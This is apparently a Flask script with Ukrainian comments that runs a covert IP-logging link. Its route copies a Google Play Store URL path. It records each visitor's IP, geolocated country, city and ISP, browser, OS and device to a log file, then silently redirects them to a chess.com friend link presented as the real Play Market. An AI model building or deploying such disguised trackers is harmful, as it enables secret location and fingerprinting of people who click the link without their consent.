from flask import Flask, request, redirect
import datetime, json
import geoip2.database
import user_agents
import os
from dotenv import load_dotenv
import requests


load_dotenv()

app = Flask(__name__)

# Шлях до GeoLite2 бази
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
MMDB_PATH = os.getenv("MMDB_PATH", "GeoLite2-City.mmdb")
if not os.path.exists(MMDB_PATH):
    print("GeoLite2-City.mmdb not found, downloading...")
    mmdb_url = os.getenv("MMDB_URL")
    if not mmdb_url:
        raise RuntimeError("MMDB_URL not set in environment variables")
    r = requests.get(mmdb_url)
    with open(MMDB_PATH, "wb") as f:
        f.write(r.content)
    print("Downloaded GeoLite2-City.mmdb")

geoip_reader = geoip2.database.Reader(MMDB_PATH)

@app.route("/store/apps/details")
def track():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua_string = request.headers.get("User-Agent")
    ua = user_agents.parse(ua_string)

    try:
        response = geoip_reader.city(ip)
        country = response.country.name
        city = response.city.name
        isp = response.traits.isp
    except:
        country = city = isp = "Unknown"

    data = {
        "time": datetime.datetime.utcnow().isoformat(),
        "ip": ip,
        "country": country,
        "city": city,
        "isp": isp,
        "user_agent": ua_string,
        "browser": ua.browser.family + " " + ua.browser.version_string,
        "os": ua.os.family + " " + ua.os.version_string,
        "device": ua.device.family,
        "accept_lang": request.headers.get("Accept-Language"),
    }

    with open("tracker_log.json", "a") as f:
        f.write(json.dumps(data, ensure_ascii=False) + "\n")

    # Після логування одразу кидаємо в справжній Play Market
    return redirect("https://link.chess.com/friend/YSm8za", code=302)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
